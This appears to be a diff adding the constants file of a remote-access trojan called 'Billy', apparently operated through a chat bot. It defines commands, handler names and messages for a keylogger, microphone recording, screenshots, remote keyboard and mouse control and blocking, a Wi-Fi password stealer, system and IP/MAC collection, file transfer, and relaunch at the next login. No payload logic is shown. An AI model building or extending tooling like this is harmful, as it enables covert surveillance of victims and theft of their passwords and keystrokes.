+KEYBOARD_SPAM_documentation = f"This mode allows you to randomly press keys for a certain amount of time. \nSyntax: /{KEYBOARD_SPAM_command} [time] (seconds, no more than {'{max_time_to_keyboard}'} seconds)."
+
+KEYBOARD_SHORTCUT = 'keyboard/shortcut'
+KEYBOARD_SHORTCUT_preview = 'Press shortcut'
+KEYBOARD_SHORTCUT_command = 'keyboardshortcut'
+KEYBOARD_SHORTCUT_documentation = f"This mode allows you to press a key or keyboard shortcut. \nSyntax: /{KEYBOARD_SHORTCUT_command} key1+key2+key3."
+
+KEYBOARD_BLOCK = 'keyboard/block'
+KEYBOARD_BLOCK_preview = 'Block'
+KEYBOARD_BLOCK_command = 'keyboardblock'
+KEYBOARD_BLOCK_handler = 'Keyboard.block_callback'
+KEYBOARD_BLOCK_documentation = f"This mode allows you to block keyboard. \nSyntax: /{KEYBOARD_BLOCK_command} [time] (seconds, no more than {'{max_time_to_keyboard}'} seconds)."
+
+KEYBOARD_PRINT = 'keyboard/print'
+KEYBOARD_PRINT_preview = 'Print text'
+KEYBOARD_PRINT_command = 'keyboardprint'
+KEYBOARD_PRINT_documentation = f"This mode allows you to type text on the keyboard. \nSyntax: /{KEYBOARD_PRINT_command} [text]."
+
+KEYLOGGER = 'keylogger'
+KEYLOGGER_preview = '\U0001f511 Keylogger'
+KEYLOGGER_handler = 'Keylogger.keylogger_callback'
+
+KEYLOGGER_ON = 'keylogger/on'
+KEYLOGGER_ON_preview = 'ON'
+KEYLOGGER_ON_handler = 'Keylogger.on_callback'
+
+
+KEYLOGGER_OFF = 'keylogger/off'
+KEYLOGGER_OFF_preview = 'OFF'
+KEYLOGGER_OFF_handler = 'Keylogger.off_callback'
+
+KEYLOGGER_GET = 'keylogger/get'
+KEYLOGGER_GET_preview = 'Get'
+KEYLOGGER_GET_handler = 'Keylogger.get_callback'
+
+KEYLOGGER_CLEAR = 'keylogger/clear'
+KEYLOGGER_CLEAR_preview = 'Clear'
+KEYLOGGER_CLEAR_handler = 'Keylogger.clearLog_callback'
+
+
+MENU = 'menu'
+MENU_preview = 'Menu'
+MENU_command = 'start'
+MENU_handler = 'Menu.menu_callback'
+
+
+MICROPHONE = 'microphone'
+MICROPHONE_preview = '\U0001f399 Microphone'
+MICROPHONE_module = 'Microphone'
+
+MICROPHONE_GETDEVICES = 'microphone/getdevices'
+MICROPHONE_GETDEVICES_preview = 'Get devices'
+MICROPHONE_GETDEVICES_handler = 'Microphone.getdevices_callback'
+
+MICROPHONE_RECORD = 'microphone/record'
+MICROPHONE_RECORD_preview = 'Record'
+MICROPHONE_RECORD_handler = 'Microphone.record_callback'
+MICROPHONE_RECORD_command = 'recordmicrophone'
+MICROPHONE_RECORD_documentation = f"This mode allows you to record audio from microphone. \nSyntax: /{MICROPHONE_RECORD_command} [device number] [time] (seconds, no more than {'{max_time_to_record_microphone}'} seconds).\nDevices:\n"
+
+
+MOUSE = 'mouse'
+MOUSE_preview = '\U0001f5b1 Mouse'
+MOUSE_module = 'Mouse'
+
+MOUSE_MOVE = 'mouse/move'
+MOUSE_MOVE_preview = 'Move'
+MOUSE_MOVE_command = 'movemouse'
+MOUSE_MOVE_documentation = f"This mode allows you to move a mouse. \nSyntax: /{MOUSE_MOVE_command} [x] [y]."
+
+MOUSE_SCROLL = 'mouse/scroll'
+MOUSE_SCROLL_preview = 'Scroll'
+MOUSE_SCROLL_command = 'scrollmouse'
+MOUSE_SCROLL_documentation = f"This mode allows you to move a mouse. \nSyntax: /{MOUSE_SCROLL_command} [value]."
+
+MOUSE_LEFTCLICK = 'mouse/leftclick'
+MOUSE_LEFTCLICK_preview = 'Left click'
+MOUSE_LEFTCLICK_handler = 'Mouse.leftclick_callback'
+
+MOUSE_RIGHTCLICK = 'mouse/rightclick'
+MOUSE_RIGHTCLICK_preview = 'Right click'
+MOUSE_RIGHTCLICK_handler = 'Mouse.rightclick_callback'
+
+MOUSE_DOUBLECLICK = 'mouse/doubleclick'
+MOUSE_DOUBLECLICK_preview = 'Double click'
+MOUSE_DOUBLECLICK_handler = 'Mouse.doubleclick_callback'
+
+MOUSE_PRESS = 'mouse/press'
+MOUSE_PRESS_preview = 'Press'
+MOUSE_PRESS_handler = 'Mouse.pressmouse_callback'
+
+MOUSE_UNPRESS = 'mouse/unpress'
+MOUSE_UNPRESS_preview = 'Unpress'
+MOUSE_UNPRESS_handler = 'Mouse.unpressmouse_callback'
+
+MOUSE_GETPOSITION = 'mouse/getposition'
+MOUSE_GETPOSITION_preview = 'Get position'
+MOUSE_GETPOSITION_handler = 'Mouse.getposition_callback'
+
+MOUSE_BLOCK = 'mouse/block'
+MOUSE_BLOCK_preview = 'Block'
+MOUSE_BLOCK_command = 'blockmouse'
+MOUSE_BLOCK_handler = 'Mouse.blockmouse_callback'
+MOUSE_BLOCK_documentation = f"This mode allows you to block mouse. \nSyntax: /{MOUSE_BLOCK_command} [time] (seconds, no more than {'{max_time_to_mouse}'} seconds)."
+
+MOUSE_SPAM = 'mouse/spam'
+MOUSE_SPAM_preview = 'Spam'
+MOUSE_SPAM_command = 'spammouse'
+MOUSE_SPAM_handler = 'Mouse.spammouse_callback'
+MOUSE_SPAM_documentation = f"This mode allows you to spam mouse. \nSyntax: /{MOUSE_SPAM_command} [time] (seconds, no more than {'{max_time_to_mouse}'} seconds)."
+
+
+PHOTO = 'photo'
+PHOTO_preview = '\U0001f5bc Photo'
+PHOTO_module = 'Photo'
+
+PHOTO_OPENPHOTO = 'photo/openphoto'
+PHOTO_OPENPHOTO_preview = 'Open photo'
+PHOTO_OPENPHOTO_command = 'openphoto'
+PHOTO_OPENPHOTO_documentation = f"This mode allows you to open photo by link. \nSyntax: /{PHOTO_OPENPHOTO_command} [link]."
+
+PHOTO_CHANGEWALLPAPERS = 'photo/changewallpapers'
+PHOTO_CHANGEWALLPAPERS_preview = 'Change wallpapers'
+PHOTO_CHANGEWALLPAPERS_command = 'changewallpapers'
+PHOTO_CHANGEWALLPAPERS_handler = 'Photo.changewallpapers_callback'
+PHOTO_CHANGEWALLPAPERS_documentation = f"This mode allows you to change wallpapers by link. \nSyntax: /{PHOTO_CHANGEWALLPAPERS_command} [link]."
+
+
+RESTART = 'restart'
+RESTART_preview = '\U00002757Restart system'
+RESTART_handler = 'Restart.restart_callback'
+
+
+SCREEN = 'screen'
+SCREEN_preview = '\U0001f4fa Screen'
+SCREEN_module = 'Screen'
+
+SCREEN_GETSIZE = 'screen/getsize'
+SCREEN_GETSIZE_preview = 'Get size'
+SCREEN_GETSIZE_handler = 'Screen.getsize_callback'
+
+SCREEN_SCREEN = 'screen/screen'
+SCREEN_SCREEN_preview = 'Screen'
+SCREEN_SCREEN_handler = 'Screen.screen_callback'
+
+
+SYSTEM = 'system'
+SYSTEM_preview = '\U00002699 System'
+SYSTEM_module = 'System'
+
+SYSTEM_GETIPMAC = 'system/getipmac'
+SYSTEM_GETIPMAC_preview = 'Ip, MAC'
+SYSTEM_GETIPMAC_handler = 'System.getipmac_callback'
+
+SYSTEM_COLLECT_SYSTEM_INFO = 'system/collectsysteminfo'
+SYSTEM_COLLECT_SYSTEM_INFO_preview = 'Collect system info'
+SYSTEM_COLLECT_SYSTEM_INFO_handler = 'System.collectsysteminfo_callback'
+
+SYSTEM_COLLECT_DISKS_INFO = 'system/collectdisksinfo'
+SYSTEM_COLLECT_DISKS_INFO_preview = 'Collect disks info'
+SYSTEM_COLLECT_DISKS_INFO_handler = 'System.collectdisksinfo_callback'
+
+SYSTEM_GET_PROCESSES = 'system/getprocesses'
+SYSTEM_GET_PROCESSES_preview = 'Get processes'
+SYSTEM_GET_PROCESSES_handler = 'System.getprocesses_callback'
+
+
+WIFI = 'WIFI'
+WIFI_preview = '\U0001f6dc Wi-Fi'
+WIFI_module = 'WIFI'
+
+WIFI_STEALER = 'WIFI/stealer'
+WIFI_STEALER_preview = 'WI-FI stealer'
+WIFI_STEALER_handler = 'WIFI.stealer_callback'
+
+WIFI_SHOWWIFI = 'WIFI/showwifi'
+WIFI_SHOWWIFI_preview = 'Show available WI-FI'
+WIFI_SHOWWIFI_handler = 'WIFI.showwifi_callback'
+
+
+TEMP = 'temp'
+
+
+MANAGEPERMISSION_prefix = 'managepermission'
+
+INVALID_ARGUMENT = 'Invalid argument.'
+
+PROCESSING = 'Processing...'
+
+TO_USE_MUST_BE_ROOT = 'To use this function, the program must be run with root.'
+
+
+menu_greeting_message = "\U0001f5a5 What would you do?"
+
+managepermissions_allow_message = 'Please press permissions you want to ALLOW:'
+managepermissions_forbid_message = 'Please press permissions you want to FORBID:'
+managepermissions_save_message = 'When you are done, save.'
+managepermissions_iderror_message = "Error. Invalid changeable id."
+savepermissions_saved_message = "Saved"
+resetpermissions_reseted_message = "Reseted"
+cancelpermissions_canceled_message = "Canceled"
+
+keyboardblock_blocked_message = "Keyboard blocked"
+keyboardblock_unblocked_message = "Keyboard unblocked."
+keyboardspam_started_message = "Keyboard spam started."
+keyboardspam_finished_message = "Keyboard spam finished."
+keyboardprint_printed_message = "Text printed."
+
+video_recording_started_message = "Recording started"
+video_recording_finished_message = "Recording finished"
+
+movemouse_moved_message = "Mouse moved."
+
+scrollmouse_scrolled_message = "Mouse scrolled."
+
+blockmouse_blocked_message = "Mouse blocked."
+blockmouse_unblocked_message = "Mouse unblocked."
+
+mousespam_started_message = "Mouse spam started."
+mousespam_finished_message = "Mouse spam finished."
+mouse_clicked_message = "Clicked."
+mousepress_pressed_message = 'Pressed.'
+mouseunpress_unpressed_message = 'Unpressed.'
+
+recordmicrophone_recording_started_message = "Recording started"
+recordmicrophone_recording_finished_message = "Recording finished"
+microphonegetdevices_devices_message = 'Devices:\n'
+
+openurl_opened_message = "Url opened."
+
+clearlogs_cleared_message = "Cleared."
+
+stopbilly_stopped_message = "Stopped. Billy will be start in the next system login."
+
+keylogger_statuschanged_message = 'Status changed -> {status}'
+keylogger_cleared_message = 'Cleared'
+
+wifistealer_answer_message = 'NAME                              PASSWORD\n'
+
+temp_message = "Sorry, but this function isn't supported."
+
+command_not_found = "Command not found: "
+
+file_or_dir_is_not_exist = "File or dir is not exist."
+file_size_is_too_large = "The file size exceeds the {size_limit} MB limit."
+file_is_not_attached = "The file is not attached."
+file_or_directory_is_protected = "The file or directory is not allowed to be modified."
+invalid_file_path = "Invalid file path."
+invalid_file = "Invalid file."
+downloading_file = "Downloading file..."
+file_downloaded = """✅ The file was saved successfully!\n📁 Path: <code>{save_path}</code>\n📊 Size: {file_size:.2f} KB"""
+
+system_restarted_message = f'System restarted.'
+
+system_getIpMac_message = 'White ip: {white_ip}\nGray ip: {gray_ip}\nMAC: {MAC}'
+system_collect_system_info_message = \
+    """System Information:
+Operating System: {os}
+OS Version: {os_version}
+OS Release: {os_release}
+Architecture: {architecture}
+Processor: {processor}
+Hostname: {hostname}
+Username: {username}
+
+Memory Information:
+Total: {total_gb} GB
+Available: {available_gb} GB
+Usage: {used_percent}%
+
+CPU Information:
+Cores: {cores}
+Logical Cores: {logical_cores}
+Current Usage: {usage_percent}%
+Frequency: {frequency} MHz
+"""
+system_collect_disks_info_message = \
+    """Disk info:
+Device: {device}
+Mountpoint: {mountpoint}
+Fstype: {fstype}
+Total gb: {total_gb}
+Used gb: {used_gb}
+Free gb: {free_gb}\n\n"""
+system_getprocesses_message = "Processes:\nName             Username         PID"
